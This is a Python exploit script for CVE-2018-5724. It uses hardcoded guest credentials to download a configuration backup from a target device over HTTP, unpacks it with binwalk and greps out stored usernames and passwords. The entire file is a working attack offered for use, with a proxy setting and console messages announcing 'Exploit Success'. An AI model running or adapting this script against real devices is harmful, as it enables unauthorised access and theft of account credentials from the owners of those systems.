import requests
import sys
import os
import time
from colorama import Fore

if len(sys.argv) is not 2:
	print(Fore.YELLOW+"[-] Example: python cve-2018-5724.py <Target IP>"+Fore.RESET)
	sys.exit()

target=sys.argv[1]
headers={'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}
url="http://"+target+"/tmpfs/config_backup.bin"
proxies={'http':'http://localhost:9000'}

print Fore.YELLOW+"[*] Attack on "+target+Fore.RESET
print Fore.YELLOW+"[+] Sending the payload"+Fore.RESET

r=requests.get(url, proxies=proxies, headers=headers)
if r.status_code == 200:
	print(Fore.YELLOW+"[+] Exploit Success"+Fore.RESET)
	time.sleep(4)
	print("")
	print("")

file = open('backup.bin','wb')
for chunk in r.iter_content(100000):
	file.write(chunk)
file.close()
print Fore.YELLOW+"---------------------------- ACCOUNT LIST ----------------------------"+Fore.RESET
os.system("binwalk -e backup.bin >/dev/null")
os.system("cd _backup.bin.extracted ; strings 0 | egrep 'username|password' ; cd ../ ; rm -rf _backup.bin.extracted ")
